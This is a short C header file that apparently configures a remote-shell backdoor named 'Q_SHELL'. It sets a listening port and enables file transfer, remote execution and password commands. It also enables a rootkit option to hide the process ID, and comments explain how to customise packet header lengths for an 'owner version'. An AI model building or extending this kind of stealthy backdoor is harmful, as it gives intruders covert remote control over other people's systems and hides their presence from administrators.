#ifndef __Q_SHELL_CONFIG_H
#define __Q_SHELL_CONFIG_H

#define _PORT 2800

/*
 * if not defined _HAVE_MORE_FUNCTION,
 *    just got shell, no command 'get/put/update/exec/passwd'
 */

#define _HAVE_MORE_FUNCTION

/*
 * You can change HLEN_* to make owner version
 * those HLEN_* must less than HEAD_LEN
 */
#define HLEN_POS_1 5
#define HLEN_POS_2 7
#define HLEN_POS_3 11
#define HLEN_PAD 13

#define HEAD_LEN 16 /* HEAD_LEN must a multiple of 8 */

/*
 * if not defined _HAVE_ROOTKIT
 *    the process pid will not hide
 */

#define _HAVE_ROOTKIT

#endif
